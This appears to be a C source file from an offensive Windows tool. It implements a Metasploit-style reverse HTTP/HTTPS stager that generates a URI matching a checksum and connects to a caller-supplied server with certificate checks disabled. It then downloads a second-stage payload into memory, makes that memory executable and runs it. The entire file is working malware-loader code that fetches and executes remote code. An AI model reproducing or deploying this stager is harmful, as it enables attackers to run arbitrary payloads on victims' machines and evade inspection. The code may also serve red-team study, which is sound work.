#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <time.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#include "SocketTools.h"
#include "Message.h"
#include "Tools.h"

/*
https://www.ccn-cert.cni.es/pdf/documentos-publicos/xiii-jornadas-stic-ccn-cert/ponencias/4423-s17-12-01-remote-code-execution-in-restricted-environments/file.html

*/

#define URL_MAX_LENGHT 84

int TextChecksum8(char* text) {
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
		temp += (int)text[i];
	return temp % 0x100;
}

void genURL(char* FullURL, int urlLenght) {
	int checksum = 0;			//Calculated Checksum placeholder. 
	char URI[URL_MAX_LENGHT] = { 0 };


	srand((unsigned int)time(0));
	while (checksum != 92) { // const int URI_CHECKSUM_INITW = 92;
		gen_random(URI, urlLenght - 2);
		checksum = TextChecksum8(URI);
	}
	FullURL[0] = '/';
	strcat_s(FullURL, urlLenght, URI);
	FullURL[urlLenght - 1] = '\0';
	return;
}

BOOL StagerReverseHttpOrHttps(WCHAR* ServeurIP, int Port,BOOL isHTTPS) {
	HINTERNET hInternetOpen;
	HINTERNET hInternetConnect;
	HINTERNET hInternetRequest;

	const int urlLenght = rand() % 40 + 30;
	char FullURL[URL_MAX_LENGHT] = { 0 }; //TO_UPDATE !!
	char* Stage2Buffer;

	DWORD flags = isHTTPS?(INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA): INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT;

	printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
	const char get[] = "GET";
	const char HttpHeader[] = "Mozilla/5.0 (Windows N WOW64; rv:11.0) Gecko Firefox/11.0";
	genURL(FullURL, urlLenght);

	hInternetOpen = InternetOpenA(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternetOpen == NULL) {
		DisplayError(L"InternetOpenA");
		return FALSE;
	}
	hInternetConnect = InternetConnectW(hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hInternetConnect == NULL) {
		DisplayError(L"InternetConnectA");
		return FALSE;
	}
	hInternetRequest = HttpOpenRequestA(hInternetConnect, get, FullURL, NULL, NULL, NULL, flags, 0);
	if (hInternetRequest == NULL) {
		DisplayError(L"HttpOpenRequestA");
		return FALSE;
	}
	if (isHTTPS) {
		DWORD dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		if (!InternetSetOptionA(hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD))) {
			DisplayError(L"InternetSetOptionA");
			return FALSE;
		}
	}
	if (!HttpSendRequestA(hInternetRequest, NULL, 0, NULL, 0)) {
		DisplayError(L"HttpSendRequestA");
		return FALSE;
	}
	Stage2Buffer = (char*)VirtualAlloc(0, (4096 * 1024), MEM_COMMIT, PAGE_READWRITE);
	if (Stage2Buffer != NULL) {
		BOOL bKeepReading = 1;
		DWORD dwBytesRead = (DWORD)-1;
		DWORD dwBytesWritten = 0;
		DWORD oldProtect = 0;

		while (bKeepReading && dwBytesRead != 0) {
			bKeepReading = InternetReadFile(hInternetRequest, (Stage2Buffer + dwBytesWritten), 4096, &dwBytesRead);
			dwBytesWritten += dwBytesRead;
		}
		InternetCloseHandle(hInternetRequest);
		InternetCloseHandle(hInternetConnect);
		InternetCloseHandle(hInternetOpen);
		printMsg(STATUS_OK, LEVEL_DEFAULT, "Stage 2 received !\n");
		// Run Stage 2 
		if (Stage2Buffer != NULL && Stage2Buffer[0] == 'M' && Stage2Buffer[1] == 'Z') {
			printMsg(STATUS_OK, LEVEL_DEFAULT, "Running Stage 2\n");
			VirtualProtect(Stage2Buffer, dwBytesWritten, PAGE_EXECUTE_READWRITE, &oldProtect);
			(*(void(*)())Stage2Buffer)();
			VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
			return TRUE;
		} else
			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail");
		VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
	}
	return FALSE;
}

BOOL StagerReverseHTTPS(WCHAR* ServeurIP, int Port) {
	return StagerReverseHttpOrHttps(ServeurIP, Port, TRUE);
}
BOOL StagerReverseHTTP(WCHAR* ServeurIP, int Port) {
	return StagerReverseHttpOrHttps(ServeurIP, Port, FALSE);
}